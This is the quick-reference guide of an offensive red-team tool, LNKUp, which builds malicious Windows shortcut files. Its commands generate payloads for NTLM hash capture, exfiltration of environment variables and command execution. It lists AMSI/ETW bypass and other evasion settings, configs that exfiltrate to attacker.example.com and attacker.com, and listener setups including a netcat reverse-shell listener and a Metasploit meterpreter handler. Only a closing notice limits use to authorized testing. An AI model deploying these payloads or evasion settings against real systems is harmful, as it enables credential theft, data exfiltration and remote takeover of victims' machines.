# LNKUp v2.0 - Quick Reference Guide

## 🚀 Quick Commands

### Setup
```bash
# Clone and setup
git clone <repo-url>
cd LNKUp

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate  # Linux/macOS
# .venv\Scripts\activate    # Windows

# Install dependencies
pip install -r requirements.txt
```

### Generate Payloads

#### 1. Interactive Wizard (Recommended)
```bash
python wizard.py
```

#### 2. NTLM Hash Capture
```bash
python generate_new.py \
  --host 192.168.1.100 \
  --type ntlm \
  --output output/capture.lnk
```

#### 3. Environment Variable Exfiltration
```bash
python generate_new.py \
  --host 192.168.1.100 \
  --vars USERNAME,COMPUTERNAME,USERDOMAIN \
  --type environment \
  --output output/recon.lnk
```

#### 4. Command Execution
```bash
python generate_new.py \
  --host 192.168.1.100 \
  --execute "whoami" \
  --type all \
  --output output/exec.lnk
```

#### 5. YAML Configuration
```bash
# Generate template
python generate_new.py --generate-config

# Edit config.yml then:
python generate_new.py \
  --config config.yml \
  --output output/advanced.lnk
```

### Testing

```bash
# Run all tests
pytest tests/ -v

# Quick test run
pytest tests/ -q

# With coverage
pytest tests/ --cov=. --cov-report=html

# Specific test file
pytest tests/test_evasion.py -v

# Open coverage report
open htmlcov/index.html  # macOS
xdg-open htmlcov/index.html  # Linux
```

### Documentation

```bash
# Build MkDocs site
mkdocs build

# Serve locally
mkdocs serve
# Open http://127.0.0.1:8000

# Deploy to GitHub Pages
mkdocs gh-deploy
```

### Verification

```bash
# Check LNK file
file output/*.lnk

# Get MD5 hash
md5sum output/*.lnk

# List generated files
ls -lh output/
```

## 📋 Payload Type Reference

| Type | Command | Use Case |
|------|---------|----------|
| **NTLM** | `--type ntlm` | Credential capture (passive) |
| **Environment** | `--type environment --vars VAR1,VAR2` | System reconnaissance |
| **All** | `--type all --vars VAR1,VAR2` | Combined NTLM + env vars |

## 🛡️ Evasion Options (YAML)

```yaml
evasion:
  anti_amsi: true           # AMSI bypass
  anti_etw: true            # ETW bypass
  jitter_min: 1000          # Min delay (ms)
  jitter_max: 5000          # Max delay (ms)
  legitimate_target: true   # Use LOLBAS proxy
  fake_timestamp: null      # Timestamp spoofing
  randomize_size: true      # File size randomization
```

## 🌐 Exfiltration Methods

### UNC (SMB)
```yaml
exfil_methods:
  - type: unc
    host: 192.168.1.100
    compress: true
```

### HTTP/HTTPS (WebDAV)
```yaml
exfil_methods:
  - type: http
    host: attacker.example.com
    port: 443
    ssl: true
    path: /webdav
```

### DNS
```yaml
exfil_methods:
  - type: dns
    host: attacker.com
    ssl: true
```

## 🎯 Listener Setup

### Responder (NTLM)
```bash
# Basic
sudo responder -I eth0 -v

# With specific protocols
sudo responder -I eth0 -v -wrf
```

### Impacket (SMB)
```bash
# Simple SMB server
sudo impacket-smbserver share /tmp/share -smb2support

# With authentication
sudo impacket-smbserver share /tmp/share -username user -password pass
```

### Netcat (Reverse Shell)
```bash
# Listener
nc -lvnp 4444

# With verbose output
nc -lvvnp 4444
```

### Metasploit (Multi-handler)
```bash
msfconsole -q -x "
  use exploit/multi/handler;
  set payload windows/meterpreter/reverse_tcp;
  set LHOST 192.168.1.100;
  set LPORT 4444;
  run
"
```

## 📊 Testing Checklist

- [ ] Install dependencies: `pip install -r requirements.txt`
- [ ] Run tests: `pytest tests/ -v`
- [ ] Generate NTLM payload
- [ ] Generate env exfil payload
- [ ] Verify LNK file format: `file output/*.lnk`
- [ ] Check file size reasonable (500-2000 bytes)
- [ ] Setup listener (Responder/Impacket)
- [ ] Test in isolated environment

## 🐛 Common Issues

### ImportError: No module named 'pydantic'
```bash
pip install pydantic pyyaml pylnk3
```

### pylnk3 not found on Linux
```bash
pip install pylnk3
```

### win32com error on Windows
```bash
pip install pywin32
```

### LNK file not generated
```bash
# Check permissions
ls -la output/

# Create directory if missing
mkdir -p output

# Run with verbose logging
python generate_new.py --verbose ...
```

## 📁 File Locations

```
LNKUp/
├── output/              # Generated LNK files
├── tests/               # Test suite
├── docs/                # MkDocs documentation
├── wizard.py            # Interactive wizard
├── generate_new.py      # Modern CLI tool
├── config.yml           # YAML config example
└── DOCUMENTATION.md     # Complete guide
```

## 🔗 Useful Links

- **Documentation**: `DOCUMENTATION.md`
- **Test Report**: `TEST_REPORT.md`
- **Project Summary**: `PROJECT_SUMMARY.md`
- **MkDocs Site**: `http://127.0.0.1:8000` (after `mkdocs serve`)

## ⚠️ Security Notice

**Use only in authorized environments:**
- Penetration testing (with contract)
- Red team assessments (authorized)
- Bug bounty programs (within scope)
- Academic research (controlled environment)

**Illegal uses are prohibited and punishable by law.**

---

**For detailed information, see [DOCUMENTATION.md](DOCUMENTATION.md)**
